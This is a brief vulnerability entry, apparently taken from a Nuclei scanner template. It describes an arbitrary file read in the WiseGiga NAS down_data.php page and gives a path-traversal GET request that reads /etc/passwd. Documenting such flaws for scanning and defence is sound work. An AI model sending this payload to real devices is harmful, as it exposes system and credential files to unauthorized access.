# Vulnerability: WiseGiga NAS - Arbitrary File Read
**Classification:** WISEGIGA
**Source:** Nuclei Template (`wisegiga-nas-lfi.yaml`)

## Description
WISEGIGA NAS down_data.php has an arbitrary file download vulnerability. Due to the lax filtering of the filename parameter on the /down_data.php page, sensitive system files can be read.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```

